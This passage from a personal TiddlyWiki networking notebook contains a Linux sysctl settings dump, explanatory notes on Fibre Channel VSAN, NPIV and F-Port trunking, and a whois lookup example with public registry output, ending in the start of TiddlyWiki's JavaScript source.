net.ipv6.neigh.pubeth0.gc_stale_time = 60
net.ipv6.neigh.pubeth0.delay_first_probe_time = 5
net.ipv6.neigh.pubeth0.base_reachable_time = 30
net.ipv6.neigh.pubeth0.retrans_time = 1000
net.ipv6.neigh.pubeth0.app_solicit = 0
net.ipv6.neigh.pubeth0.ucast_solicit = 3
net.ipv6.neigh.pubeth0.mcast_solicit = 3
net.ipv6.neigh.priveth1.locktime = 0
net.ipv6.neigh.priveth1.proxy_delay = 80
net.ipv6.neigh.priveth1.anycast_delay = 100
net.ipv6.neigh.priveth1.proxy_qlen = 64
net.ipv6.neigh.priveth1.unres_qlen = 3
net.ipv6.neigh.priveth1.gc_stale_time = 60
net.ipv6.neigh.priveth1.delay_first_probe_time = 5
net.ipv6.neigh.priveth1.base_reachable_time = 30
net.ipv6.neigh.priveth1.retrans_time = 1000
net.ipv6.neigh.priveth1.app_solicit = 0
net.ipv6.neigh.priveth1.ucast_solicit = 3
net.ipv6.neigh.priveth1.mcast_solicit = 3
net.ipv6.neigh.sit0.locktime = 0
net.ipv6.neigh.sit0.proxy_delay = 80
net.ipv6.neigh.sit0.anycast_delay = 100
net.ipv6.neigh.sit0.proxy_qlen = 64
net.ipv6.neigh.sit0.unres_qlen = 3
net.ipv6.neigh.sit0.gc_stale_time = 60
net.ipv6.neigh.sit0.delay_first_probe_time = 5
net.ipv6.neigh.sit0.base_reachable_time = 30
net.ipv6.neigh.sit0.retrans_time = 1000
net.ipv6.neigh.sit0.app_solicit = 0
net.ipv6.neigh.sit0.ucast_solicit = 3
net.ipv6.neigh.sit0.mcast_solicit = 3
net.ipv6.neigh.priveth0.locktime = 0
net.ipv6.neigh.priveth0.proxy_delay = 80
net.ipv6.neigh.priveth0.anycast_delay = 100
net.ipv6.neigh.priveth0.proxy_qlen = 64
net.ipv6.neigh.priveth0.unres_qlen = 3
net.ipv6.neigh.priveth0.gc_stale_time = 60
net.ipv6.neigh.priveth0.delay_first_probe_time = 5
net.ipv6.neigh.priveth0.base_reachable_time = 30
net.ipv6.neigh.priveth0.retrans_time = 1000
net.ipv6.neigh.priveth0.app_solicit = 0
net.ipv6.neigh.priveth0.ucast_solicit = 3
net.ipv6.neigh.priveth0.mcast_solicit = 3
net.ipv6.neigh.lo.locktime = 0
net.ipv6.neigh.lo.proxy_delay = 80
net.ipv6.neigh.lo.anycast_delay = 100
net.ipv6.neigh.lo.proxy_qlen = 64
net.ipv6.neigh.lo.unres_qlen = 3
net.ipv6.neigh.lo.gc_stale_time = 60
net.ipv6.neigh.lo.delay_first_probe_time = 5
net.ipv6.neigh.lo.base_reachable_time = 30
net.ipv6.neigh.lo.retrans_time = 1000
net.ipv6.neigh.lo.app_solicit = 0
net.ipv6.neigh.lo.ucast_solicit = 3
net.ipv6.neigh.lo.mcast_solicit = 3
net.ipv6.neigh.default.gc_thresh3 = 1024
net.ipv6.neigh.default.gc_thresh2 = 512
net.ipv6.neigh.default.gc_thresh1 = 128
net.ipv6.neigh.default.gc_interval = 30
net.ipv6.neigh.default.locktime = 0
net.ipv6.neigh.default.proxy_delay = 80
net.ipv6.neigh.default.anycast_delay = 100
net.ipv6.neigh.default.proxy_qlen = 64
net.ipv6.neigh.default.unres_qlen = 3
net.ipv6.neigh.default.gc_stale_time = 60
net.ipv6.neigh.default.delay_first_probe_time = 5
net.ipv6.neigh.default.base_reachable_time = 30
net.ipv6.neigh.default.retrans_time = 1000
net.ipv6.neigh.default.app_solicit = 0
net.ipv6.neigh.default.ucast_solicit = 3
net.ipv6.neigh.default.mcast_solicit = 3
net.ipv6.mld_max_msf = 10
net.ipv6.ip6frag_secret_interval = 600
net.ipv6.ip6frag_time = 60
net.ipv6.ip6frag_low_thresh = 196608
net.ipv6.ip6frag_high_thresh = 262144
net.ipv6.bindv6only = 0
net.ipv6.icmp.ratelimit = 1000
net.ipv6.route.min_adv_mss = 1
net.ipv6.route.mtu_expires = 600
net.ipv6.route.gc_elasticity = 0
net.ipv6.route.gc_interval = 30
net.ipv6.route.gc_timeout = 60
net.ipv6.route.gc_min_interval = 0
net.ipv6.route.max_size = 4096
net.ipv6.route.gc_thresh = 1024
net.unix.max_dgram_qlen = 10
net.token-ring.rif_timeout = 600000
net.ipv4.ip_conntrack_max = 65536
net.ipv4.netfilter.ip_conntrack_generic_timeout = 600
net.ipv4.netfilter.ip_conntrack_icmp_timeout = 30
net.ipv4.netfilter.ip_conntrack_udp_timeout_stream = 180
net.ipv4.netfilter.ip_conntrack_udp_timeout = 30
net.ipv4.netfilter.ip_conntrack_tcp_timeout_close = 10
net.ipv4.netfilter.ip_conntrack_tcp_timeout_time_wait = 120
net.ipv4.netfilter.ip_conntrack_tcp_timeout_last_ack = 30
net.ipv4.netfilter.ip_conntrack_tcp_timeout_close_wait = 60
net.ipv4.netfilter.ip_conntrack_tcp_timeout_fin_wait = 120
net.ipv4.netfilter.ip_conntrack_tcp_timeout_established = 432000
net.ipv4.netfilter.ip_conntrack_tcp_timeout_syn_recv = 60
net.ipv4.netfilter.ip_conntrack_tcp_timeout_syn_sent = 120
net.ipv4.netfilter.ip_conntrack_buckets = 8192
net.ipv4.netfilter.ip_conntrack_count = 59
net.ipv4.netfilter.ip_conntrack_max = 65536
net.ipv4.conf.pubeth1.force_igmp_version = 0
net.ipv4.conf.pubeth1.disable_policy = 0
net.ipv4.conf.pubeth1.disable_xfrm = 0
net.ipv4.conf.pubeth1.arp_ignore = 0
net.ipv4.conf.pubeth1.arp_announce = 0
net.ipv4.conf.pubeth1.arp_filter = 0
net.ipv4.conf.pubeth1.tag = 0
net.ipv4.conf.pubeth1.log_martians = 0
net.ipv4.conf.pubeth1.bootp_relay = 0
net.ipv4.conf.pubeth1.medium_id = 0
net.ipv4.conf.pubeth1.proxy_arp = 0
net.ipv4.conf.pubeth1.accept_source_route = 1
net.ipv4.conf.pubeth1.send_redirects = 1
net.ipv4.conf.pubeth1.rp_filter = 0
net.ipv4.conf.pubeth1.shared_media = 1
net.ipv4.conf.pubeth1.secure_redirects = 1
net.ipv4.conf.pubeth1.accept_redirects = 1
net.ipv4.conf.pubeth1.mc_forwarding = 0
net.ipv4.conf.pubeth1.forwarding = 1
net.ipv4.conf.pubeth0.force_igmp_version = 0
net.ipv4.conf.pubeth0.disable_policy = 0
net.ipv4.conf.pubeth0.disable_xfrm = 0
net.ipv4.conf.pubeth0.arp_ignore = 0
net.ipv4.conf.pubeth0.arp_announce = 0
net.ipv4.conf.pubeth0.arp_filter = 0
net.ipv4.conf.pubeth0.tag = 0
net.ipv4.conf.pubeth0.log_martians = 0
net.ipv4.conf.pubeth0.bootp_relay = 0
net.ipv4.conf.pubeth0.medium_id = 0
net.ipv4.conf.pubeth0.proxy_arp = 0
net.ipv4.conf.pubeth0.accept_source_route = 1
net.ipv4.conf.pubeth0.send_redirects = 1
net.ipv4.conf.pubeth0.rp_filter = 0
net.ipv4.conf.pubeth0.shared_media = 1
net.ipv4.conf.pubeth0.secure_redirects = 1
net.ipv4.conf.pubeth0.accept_redirects = 1
net.ipv4.conf.pubeth0.mc_forwarding = 0
net.ipv4.conf.pubeth0.forwarding = 1
net.ipv4.conf.priveth0.force_igmp_version = 0
net.ipv4.conf.priveth0.disable_policy = 0
net.ipv4.conf.priveth0.disable_xfrm = 0
net.ipv4.conf.priveth0.arp_ignore = 0
net.ipv4.conf.priveth0.arp_announce = 0
net.ipv4.conf.priveth0.arp_filter = 0
net.ipv4.conf.priveth0.tag = 0
net.ipv4.conf.priveth0.log_martians = 0
net.ipv4.conf.priveth0.bootp_relay = 0
net.ipv4.conf.priveth0.medium_id = 0
net.ipv4.conf.priveth0.proxy_arp = 0
net.ipv4.conf.priveth0.accept_source_route = 1
net.ipv4.conf.priveth0.send_redirects = 1
net.ipv4.conf.priveth0.rp_filter = 0
net.ipv4.conf.priveth0.shared_media = 1
net.ipv4.conf.priveth0.secure_redirects = 1
net.ipv4.conf.priveth0.accept_redirects = 1
net.ipv4.conf.priveth0.mc_forwarding = 0
net.ipv4.conf.priveth0.forwarding = 1
net.ipv4.conf.lo.force_igmp_version = 0
net.ipv4.conf.lo.disable_policy = 0
net.ipv4.conf.lo.disable_xfrm = 0
net.ipv4.conf.lo.arp_ignore = 0
net.ipv4.conf.lo.arp_announce = 0
net.ipv4.conf.lo.arp_filter = 0
net.ipv4.conf.lo.tag = 0
net.ipv4.conf.lo.log_martians = 0
net.ipv4.conf.lo.bootp_relay = 0
net.ipv4.conf.lo.medium_id = 0
net.ipv4.conf.lo.proxy_arp = 0
net.ipv4.conf.lo.accept_source_route = 1
net.ipv4.conf.lo.send_redirects = 1
net.ipv4.conf.lo.rp_filter = 0
net.ipv4.conf.lo.shared_media = 1
net.ipv4.conf.lo.secure_redirects = 1
net.ipv4.conf.lo.accept_redirects = 1
net.ipv4.conf.lo.mc_forwarding = 0
net.ipv4.conf.lo.forwarding = 1
net.ipv4.conf.default.force_igmp_version = 0
net.ipv4.conf.default.disable_policy = 0
net.ipv4.conf.default.disable_xfrm = 0
net.ipv4.conf.default.arp_ignore = 0
net.ipv4.conf.default.arp_announce = 0
net.ipv4.conf.default.arp_filter = 0
net.ipv4.conf.default.tag = 0
net.ipv4.conf.default.log_martians = 0
net.ipv4.conf.default.bootp_relay = 0
net.ipv4.conf.default.medium_id = 0
net.ipv4.conf.default.proxy_arp = 0
net.ipv4.conf.default.accept_source_route = 1
net.ipv4.conf.default.send_redirects = 1
net.ipv4.conf.default.rp_filter = 0
net.ipv4.conf.default.shared_media = 1
net.ipv4.conf.default.secure_redirects = 1
net.ipv4.conf.default.accept_redirects = 1
net.ipv4.conf.default.mc_forwarding = 0
net.ipv4.conf.default.forwarding = 1
net.ipv4.conf.all.force_igmp_version = 0
net.ipv4.conf.all.disable_policy = 0
net.ipv4.conf.all.disable_xfrm = 0
net.ipv4.conf.all.arp_ignore = 0
net.ipv4.conf.all.arp_announce = 0
net.ipv4.conf.all.arp_filter = 0
net.ipv4.conf.all.tag = 0
net.ipv4.conf.all.log_martians = 0
net.ipv4.conf.all.bootp_relay = 0
net.ipv4.conf.all.medium_id = 0
net.ipv4.conf.all.proxy_arp = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.send_redirects = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.all.shared_media = 1
net.ipv4.conf.all.secure_redirects = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.mc_forwarding = 0
net.ipv4.conf.all.forwarding = 1
net.ipv4.neigh.pubeth1.locktime = 100
net.ipv4.neigh.pubeth1.proxy_delay = 80
net.ipv4.neigh.pubeth1.anycast_delay = 100
net.ipv4.neigh.pubeth1.proxy_qlen = 64
net.ipv4.neigh.pubeth1.unres_qlen = 3
net.ipv4.neigh.pubeth1.gc_stale_time = 60
net.ipv4.neigh.pubeth1.delay_first_probe_time = 5
net.ipv4.neigh.pubeth1.base_reachable_time = 30
net.ipv4.neigh.pubeth1.retrans_time = 100
net.ipv4.neigh.pubeth1.app_solicit = 0
net.ipv4.neigh.pubeth1.ucast_solicit = 3
net.ipv4.neigh.pubeth1.mcast_solicit = 3
net.ipv4.neigh.pubeth0.locktime = 100
net.ipv4.neigh.pubeth0.proxy_delay = 80
net.ipv4.neigh.pubeth0.anycast_delay = 100
net.ipv4.neigh.pubeth0.proxy_qlen = 64
net.ipv4.neigh.pubeth0.unres_qlen = 3
net.ipv4.neigh.pubeth0.gc_stale_time = 60
net.ipv4.neigh.pubeth0.delay_first_probe_time = 5
net.ipv4.neigh.pubeth0.base_reachable_time = 30
net.ipv4.neigh.pubeth0.retrans_time = 100
net.ipv4.neigh.pubeth0.app_solicit = 0
net.ipv4.neigh.pubeth0.ucast_solicit = 3
net.ipv4.neigh.pubeth0.mcast_solicit = 3
net.ipv4.neigh.priveth0.locktime = 100
net.ipv4.neigh.priveth0.proxy_delay = 80
net.ipv4.neigh.priveth0.anycast_delay = 100
net.ipv4.neigh.priveth0.proxy_qlen = 64
net.ipv4.neigh.priveth0.unres_qlen = 3
net.ipv4.neigh.priveth0.gc_stale_time = 60
net.ipv4.neigh.priveth0.delay_first_probe_time = 5
net.ipv4.neigh.priveth0.base_reachable_time = 30
net.ipv4.neigh.priveth0.retrans_time = 100
net.ipv4.neigh.priveth0.app_solicit = 0
net.ipv4.neigh.priveth0.ucast_solicit = 3
net.ipv4.neigh.priveth0.mcast_solicit = 3
net.ipv4.neigh.lo.locktime = 100
net.ipv4.neigh.lo.proxy_delay = 80
net.ipv4.neigh.lo.anycast_delay = 100
net.ipv4.neigh.lo.proxy_qlen = 64
net.ipv4.neigh.lo.unres_qlen = 3
net.ipv4.neigh.lo.gc_stale_time = 60
net.ipv4.neigh.lo.delay_first_probe_time = 5
net.ipv4.neigh.lo.base_reachable_time = 30
net.ipv4.neigh.lo.retrans_time = 100
net.ipv4.neigh.lo.app_solicit = 0
net.ipv4.neigh.lo.ucast_solicit = 3
net.ipv4.neigh.lo.mcast_solicit = 3
net.ipv4.neigh.default.gc_thresh3 = 1024
net.ipv4.neigh.default.gc_thresh2 = 512
net.ipv4.neigh.default.gc_thresh1 = 128
net.ipv4.neigh.default.gc_interval = 30
net.ipv4.neigh.default.locktime = 100
net.ipv4.neigh.default.proxy_delay = 80
net.ipv4.neigh.default.anycast_delay = 100
net.ipv4.neigh.default.proxy_qlen = 64
net.ipv4.neigh.default.unres_qlen = 3
net.ipv4.neigh.default.gc_stale_time = 60
net.ipv4.neigh.default.delay_first_probe_time = 5
net.ipv4.neigh.default.base_reachable_time = 30
net.ipv4.neigh.default.retrans_time = 100
net.ipv4.neigh.default.app_solicit = 0
net.ipv4.neigh.default.ucast_solicit = 3
net.ipv4.neigh.default.mcast_solicit = 3
net.ipv4.tcp_westwood = 0
net.ipv4.ipfrag_max_dist = 64
net.ipv4.ipfrag_secret_interval = 600
net.ipv4.tcp_low_latency = 0
net.ipv4.tcp_frto = 0
net.ipv4.tcp_tw_reuse = 0
net.ipv4.icmp_ratemask = 6168
net.ipv4.icmp_ratelimit = 1000
net.ipv4.tcp_adv_win_scale = 2
net.ipv4.tcp_app_win = 31
net.ipv4.tcp_rmem = 4096	87380	174760
net.ipv4.tcp_wmem = 4096	16384	131072
net.ipv4.tcp_mem = 392192	392704	393216
net.ipv4.tcp_dsack = 1
net.ipv4.tcp_ecn = 0
net.ipv4.tcp_reordering = 3
net.ipv4.tcp_fack = 1
net.ipv4.tcp_orphan_retries = 0
net.ipv4.inet_peer_gc_maxtime = 120
net.ipv4.inet_peer_gc_mintime = 10
net.ipv4.inet_peer_maxttl = 600
net.ipv4.inet_peer_minttl = 120
net.ipv4.inet_peer_threshold = 65664
net.ipv4.igmp_max_msf = 10
net.ipv4.igmp_max_memberships = 20
net.ipv4.route.secret_interval = 600
net.ipv4.route.min_adv_mss = 256
net.ipv4.route.min_pmtu = 552
net.ipv4.route.mtu_expires = 600
net.ipv4.route.gc_elasticity = 8
net.ipv4.route.error_burst = 5000
net.ipv4.route.error_cost = 1000
net.ipv4.route.redirect_silence = 20480
net.ipv4.route.redirect_number = 9
net.ipv4.route.redirect_load = 20
net.ipv4.route.gc_interval = 60
net.ipv4.route.gc_timeout = 300
net.ipv4.route.gc_min_interval = 0
net.ipv4.route.max_size = 2097152
net.ipv4.route.gc_thresh = 131072
net.ipv4.route.max_delay = 10
net.ipv4.route.min_delay = 2
net.ipv4.icmp_ignore_bogus_error_responses = 0
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_echo_ignore_all = 0
net.ipv4.ip_local_port_range = 32768	61000
net.ipv4.tcp_max_syn_backlog = 1024
net.ipv4.tcp_rfc1337 = 0
net.ipv4.tcp_stdurg = 0
net.ipv4.tcp_abort_on_overflow = 0
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_fin_timeout = 60
net.ipv4.tcp_retries2 = 15
net.ipv4.tcp_retries1 = 3
net.ipv4.tcp_keepalive_intvl = 75
net.ipv4.tcp_keepalive_probes = 9
net.ipv4.tcp_keepalive_time = 7200
net.ipv4.ipfrag_time = 30
net.ipv4.ip_dynaddr = 0
net.ipv4.ipfrag_low_thresh = 196608
net.ipv4.ipfrag_high_thresh = 262144
net.ipv4.tcp_max_tw_buckets = 180000
net.ipv4.tcp_max_orphans = 65536
net.ipv4.tcp_synack_retries = 5
net.ipv4.tcp_syn_retries = 5
net.ipv4.ip_nonlocal_bind = 0
net.ipv4.ip_no_pmtu_disc = 0
net.ipv4.ip_autoconfig = 0
net.ipv4.ip_default_ttl = 64
net.ipv4.ip_forward = 1
net.ipv4.tcp_retrans_collapse = 1
net.ipv4.tcp_sack = 1
net.ipv4.tcp_window_scaling = 1
net.ipv4.tcp_timestamps = 1
net.core.somaxconn = 128
net.core.optmem_max = 20480
net.core.message_burst = 10
net.core.message_cost = 5
net.core.mod_cong = 290
net.core.lo_cong = 100
net.core.no_cong = 20
net.core.no_cong_thresh = 10
net.core.netdev_max_backlog = 300
net.core.dev_weight = 64
net.core.rmem_default = 135168
net.core.wmem_default = 135168
net.core.rmem_max = 131071
net.core.wmem_max = 131071
vm.toss_page_cache_nodes = 
vm.disable_cap_mlock = 0
vm.block_dump = 0
vm.laptop_mode = 0
vm.max_map_count = 65536
vm.min_free_kbytes = 8380
vm.lowmem_reserve_ratio = 256	32
vm.overcommit_hugepages = 0
vm.nr_hugepages = 0
vm.swappiness = 60
vm.nr_pdflush_threads = 2
vm.dirty_expire_centisecs = 3000
vm.dirty_writeback_centisecs = 500
vm.dirty_ratio = 40
vm.dirty_background_ratio = 10
vm.page-cluster = 3
vm.overcommit_ratio = 50
vm.overcommit_memory = 0
kernel.suid_dumpable = 0
kernel.HZ = 1000
kernel.min-timeslice = 10000
kernel.max-timeslice = 300000
kernel.ngroups_max = 65536
kernel.printk_ratelimit_burst = 10
kernel.printk_ratelimit = 5
kernel.panic_on_oops = 0
kernel.pid_max = 32768
kernel.overflowgid = 65534
kernel.overflowuid = 65534
kernel.check_deadlocks = 1
kernel.pty.nr = 6
kernel.pty.max = 4096
kernel.random.uuid = 3d5fef8c-4eed-4f36-af07-79eacd040d81
kernel.random.boot_id = faf2b052-669d-45d5-ac30-14dba0a3ec2a
kernel.random.write_wakeup_threshold = 128
kernel.random.read_wakeup_threshold = 64
kernel.random.entropy_avail = 3840
kernel.random.poolsize = 512
kernel.threads-max = 274432
kernel.cad_pid = 1
kernel.sysrq = 0
kernel.sem = 250	32000	32	128
kernel.msgmnb = 16384
kernel.msgmni = 16
kernel.msgmax = 8192
kernel.shmmni = 4096
kernel.shmall = 2097152
kernel.shmmax = 33554432
kernel.acct = 4	2	30
kernel.hotplug = /sbin/vxhotplug
kernel.modprobe = /sbin/modprobe
kernel.printk = 1	4	1	7
kernel.ctrl-alt-del = 0
kernel.real-root-dev = 2049
kernel.cap-bound = -257
kernel.tainted = 19
kernel.core_pattern = core
kernel.core_uses_pid = 0
kernel.panic = 0
kernel.domainname = 
kernel.hostname = nasgw34_2
kernel.version = #1 SMP Mon Dec 12 18:32:25 UTC 2005
kernel.osrelease = 2.6.5-7.244-smp
kernel.ostype = Linux
fs.jbd-debug = 0
fs.mqueue.msgsize_max = 8192
fs.mqueue.msg_max = 10
fs.mqueue.queues_max = 256
fs.nfs.nlm_max_hosts = 256
fs.nfs.nlm_tcpport = 4045
fs.nfs.nlm_udpport = 4045
fs.nfs.nlm_timeout = 10
fs.nfs.nlm_grace_period = 0
fs.quota.syncs = 20
fs.quota.free_dquots = 0
fs.quota.allocated_dquots = 0
fs.quota.cache_hits = 0
fs.quota.writes = 0
fs.quota.reads = 0
fs.quota.drops = 0
fs.quota.lookups = 0
fs.mmap-hugepages-min-mapping = 256
fs.mmap-use-hugepages = 0
fs.shm-use-hugepages = 0
fs.aio-max-nr = 65536
fs.aio-nr = 0
fs.lease-break-time = 45
fs.dir-notify-enable = 1
fs.leases-enable = 1
fs.overflowgid = 65534
fs.overflowuid = 65534
fs.dentry-state = 41672	34904	45	0	0	0
fs.file-max = 1756364
fs.file-nr = 2130	0	1756364
fs.inode-state = 34572	1	0	0	0	0	0
fs.inode-nr = 34572	1
</pre>
</div>
<div title="vSAN" modifier="YourName" created="200811220431" changecount="1">
<pre>!vSAN
In computer networking, a virtual storage area network (VSAN) is a collection of ports from a set of connected Fibre Channel switches, that form a virtual fabric. Ports within a single switch can be partitioned into multiple VSANs, despite sharing hardware resources. Conversely, multiple switches can join a number of ports to form a single VSAN.

A VSAN, like each FC fabric, can offer different high-level protocols such as FCP, FCIP, FICON, iSCSI. Each VSAN is a separate self-contained fabric using distinctive security policies, zones, events, memberships, and name services. Traffic is also separate.

One major concern when designing and building Fibre Channel-based SANs is the total number of switches or domains that can exist in a physical fabric. As the edge switch population grows, the number of domain IDs becomes a concern. The domain is the address of a physical switch or logical virtual fabric; the domain ID is the most significant byte in an endpoint Fibre Channel ID.

[img[images/fc.id.jpg]]

The switch uses this Fibre Channel ID to route frames from a given source (initiator) to any destination (target) in a SAN fabric. This 1 byte allows up to 256 possible addresses. The Fibre Channel standard allows for a total of 239 port addresses.

Another design concern is interoperability with third-party switches. In the past, different SAN fabric vendors interpreted the Fibre Channel addressing standard differently. In addition, some vendor-specific attributes used for switch-to-switch connectivity (or expansion port [E-Port] connectivity) made connection of switches from different vendors challenging, leading customers to implement edge switch technology that matched the core director type in the fabric.

!N_Port ID Virtualization
N_Port ID Virtualization or NPIV is a Fibre Channel facility allowing multiple N_Port IDs to share a single physical N_Port. This allows multiple Fibre Channel initiators to occupy a single physical port, easing hardware requirements in Storage area network design, especially where virtual SANs are called for.

NPIV allows a Fibre Channel host connection or N-Port, to be assigned multiple N-Port IDs or Fibre Channel IDs (FCIDs) over a single link. All FCIDs assigned can now be managed on a Fibre Channel fabric as unique entities on the same physical host. Different applications can be used in conjunction with NPIV. In a virtual machine environment where many host operating systems or applications are running on a physical host, each virtual machine can now be managed independently from zoning, aliasing, and security perspectives.

A host bus adapter (HBA) that supports the NPIV feature follows the standard login process. The initial connection and login to the fabric is performed through the standard F-Port login (FLOGI) process. All subsequent logins for either virtual machines or logical part ions on a mainframe are transformed into FDISC login commands. The FDISC logins follow the same standard process. Figure 3 steps through the login process of an NPIV uplink and the local logins to the NPIV-enabled adapter.

Normally N_Port initialization proceeds like this:
* N_Port sends FLOGI to address 0xFFFFFE to obtain a valid address
* N_Port sends PLOGI to address 0xFFFFFC to register this address with the name server
* N_Port sends SCR to address 0xFFFFFD to register for state change notifications

However with NPIV it may continue like this:

* N_Port sends FDISC to address 0xFFFFFE to obtain an additional address
* N_Port sends PLOGI to address 0xFFFFFC to register his additional address with the name server
* N_Port sends SCR to address 0xFFFFFD to register for state change notifications.
* ... (repeat FDISC/PLOGI/SCR for next address)

FDISC is abbreviation of &quot;Discover Fabric Service Parameters&quot;, which is a misleading name in this context. It works just like FLOGI.

When using NPIV in vSAN environment, each subsequent FDISC login will be a part of the same VSAN as the original fabric login.

!N-Port Virtualiser
An extension to NPIV is the N-Port Virtualizer feature. The N-Port Virtualizer feature allows the blade switch or top-of-rack fabric device to behave as an NPIV-based HBA to the core Fibre Channel director (Figure 4). As end devices log into the NPV-enabled edge switches, the FCID addresses that are assigned use the domain of the core director. Because the connection is treated as an N-Port and not an E-Port to the core director, the edge switch shares the domain ID of the core switch as FCIDs are being allocated. The edge NPV-enabled switch no longer requires a separate domain ID to receive connectivity to the fabric.

!F-Port Trunking(Channeling)
Fabric Port (F-Port) Trunking and F-Port Channeling. A PortChannel is the bundling of multiple physical interfaces into one logical high-bandwidth link. 

Two new features on the horizon will provide more granular management from an NPV perspective. These are Fabric Port (F-Port) Trunking and F-Port Channeling. A PortChannel is the bundling of multiple physical interfaces into one logical high-bandwidth link. PortChannels provide higher bandwidth, increased link redundancy, and load balancing between two switches. In the Cisco implementation, a port on any module, anywhere on the switch, can be a part of a PortChannel. Route table changes due to a single link failure in the PortChannel interface are unaffected.

The Cisco virtual fabric implementation states that a single F-Port can be a part of one, and only one, VSAN at any given time. An interswitch link (ISL) that is configured in trunk mode, however, can carry multiple VSANs across a single ISL or PortChannel and still keep fabric separation between VSANs. One of the drawbacks of configuring edge devices in NPV mode is that because the link between switches is configured to log in to the fabric as an F-Port, the F-Port uplink can be configured to be in only a single VSAN and carry only a single VSAN across its link. The NPV device can be configured with multiple uplinks, and each can be placed in a different VSAN. The hosts on the NPV device can then be placed in one of those VSANs, and the hosts will log through the appropriate NP uplink port.

F-Port Trunking will allow a single F-Port to participate in multiple VSANs and follow the trunking protocol that Cisco currently has across an ISL. This feature will allow the consolidation of uplinks ports necessary for extending VSAN connectivity to the NP device. Figure 6 shows the connection and how the network will look with F-Port Trunking enabled.

Enabling F-Port Trunking allows any blade server connectivity over any NP uplink across which the VSAN is trunked. This feature can be extended to HBA connections when the HBA vendors enable VSAN trunking within their firmware. F-Port Trunking can enable virtual machines on physical servers to log in and participate in separate VSANs per application or line of business.
The other significant feature on the horizon is F-Port Channeling (Figure 7). As described earlier, when a host logs in to the local switch, its FDISC message is load balanced in a round-robin fashion. Should the link on which the host has its session fail, the host would have to log in again to the fabric, restarting the login process. N-Port uplinks from the NPV device cannot be bundled to take advantage of any type of high availability.

F-Port Channeling will allow the same type of resiliency and availability between switches as an ISL PortChannel has today. In this configuration, multiple NP uplink ports can be bundled or channeled together to form a single logical link. Should a single link in the channel fail, the data frames crossing that single link would be lost, and typical application and network error recovery would take place.

The other concern that F-Port Channeling resolves also relates to link failures. With F-Port Channeling configured, when a link that originally carried the login process from the edge NPV device to the core fails, the host is no longer required to perform a full login again to the fabric. The login state remains intact even though the link has failed. As long as a single link in the channel is operational, the host does not go through the login process

In a F-Port Port-Channel logical link, if a single link fails in the channel, the host no longer has to login again to the fabric to get connectivity. The host will remain logged in; the data flow that was on the link that failed will need to go through recovery mode, but the host will stay logged into the network. Data traffic will also be load balanced on a src/dst hash or src/dst/oxid hash to send traffic down the bundled uplinks. This feature removes the need to perform manual load balancing again across NP uplinks during a failure and recovery period.



</pre>
</div>
<div title="whois" modifier="YourName" modified="201006061516" created="200811211755" changecount="2">
<pre>The whois service can also help you figure out the purpose of a given domain. Unfortunately, there are many whois serversmost good administrators of top-level domains run oneand they don't talk to each other like nameservers do. Consequently, the first step to using whois is finding the right whois server. 
One of the easiest places to start your search for the right whois server is at http://www.allwhois.com (Figure 3-1). We mentioned earlier that this site has a list of the web sites for each country code's top-level domain; it also sports a unified whois search facility. 

{{{
$ nslookup 7dyn94.ztm.casema.net
   
Name: 7dyn94.ztm.casema.net
Address: 212.64.110.94

$ whois 212.64.110.94@whois.arin.net
[whois.arin.net]
European Regional Internet Registry/RIPE NCC (NET-RIPE-NCC-)
   These addresses have been further assigned to European users.
    Contact information can be found in the RIPE database, via the
    WHOIS and TELNET servers at whois.ripe.net, and at
    http://www.ripe.net/db/whois.html
Netname: RIPE-NCC-212
Netblock: 212.0.0.0 - 212.255.255.255
Maintainer: RIPE
Coordinator:
RIPE Network Coordination Centre  (RIPE-NCC-ARIN) nicdb@RIPE.NET
+31 20 535 4444
Fax- - +31 20 535 4445
Domain System inverse mapping provided by:
NS.RIPE.NET                  193.0.0.193
NS.EU.NET                    192.16.202.11
AUTH03.NS.UU.NET             198.6.1.83
NS2.NIC.FR                   192.93.0.4
SUNIC.SUNET.SE               192.36.125.2
MUNNARI.OZ.AU                128.250.1.21
NS.APNIC.NET                 203.37.255.97
To search on arbitrary strings, see the Database page on
the RIPE NCC web-site at http://www.ripe.net/db/
Record last updated on 16-Oct-1998.
Database last updated on 9-Nov-2000 07:02:34 EDT.
The ARIN Registration Services Host contains ONLY Internet
network information: Networks, ASNs and related POCs.
Use the whois server at rs.internic.net for DOMAIN related
Information and whois.nic.mil for NIPRNET Information.

$ whois casema.net@whois.networksolutions.com 
Registrant:
N.V. Casema (CASEMA-DOM)
    P.O. Box 345
    Delft, 2600 AH
    THE NETHERLANDS
    Domain Name: CASEMA.NET
    Administrative Contact:
    Network Operations Centre  (NOC137-ORG)  domain-tech@EURO.NET
    EuroNet Internet BV
    Muiderstraat 1
    Amsterdam
    NL
    +31 20 5355555
    Fax- +31 20 5355400
    Technical Contact, Zone Contact:
    Davids, Marco  (MD2446)  domaintech1@CASEMA.NET
    N.V. Casema - IKC
    Brassersplein 2
    Delft
    ZH
    2612 CT
    NL
    +31(0)15 8881000 (FAX) +31(0)15 8881099
    Billing Contact:
    Finance Departement  (FD5-ORG)  nic-invoices@EURONET.NL
    EuroNet Internet BV
    Postbus 11095
    Amsterdam
    NL
    +31 20 5355555
    Fax- +31 20 5355400
    Record last updated on 13-Jun-2000.
    Record expires on 30-Jan-2001.
    Record created on 28-Jan-1997.
    Database last updated on 7-Nov-2000 19:15:09 EST.
    Domain servers in listed order:
    NS.CASEMA.NL                 195.96.96.97
    NS1.CASEMA.NET               195.96.96.33
}}}

</pre>
</div>
</div>
<!--POST-STOREAREA-->
<!--POST-BODY-START-->
<!--POST-BODY-END-->
<script type="text/javascript">
//<![CDATA[
//
// Please note:
// 
// * This code is designed to be readable but for compactness it only includes brief comments. You can see fuller comments
//   in the project Subversion repository at http://svn.tiddlywiki.org/Trunk/core/
//
// * You should never need to modify this source code directly. TiddlyWiki is carefully designed to allow deep customisation
//   without changing the core code. Please consult the development group at http://groups.google.com/group/TiddlyWikiDev
// 

//--
//-- Configuration repository
//--

// Miscellaneous options
var config = {
	numRssItems: 20, // Number of items in the RSS feed
	animDuration: 400, // Duration of UI animations in milliseconds
	cascadeFast: 20, // Speed for cascade animations (higher == slower)
	cascadeSlow: 60, // Speed for EasterEgg cascade animations
	cascadeDepth: 5 // Depth of cascade animation
};

// Adaptors
config.adaptors = {};

// Backstage tasks
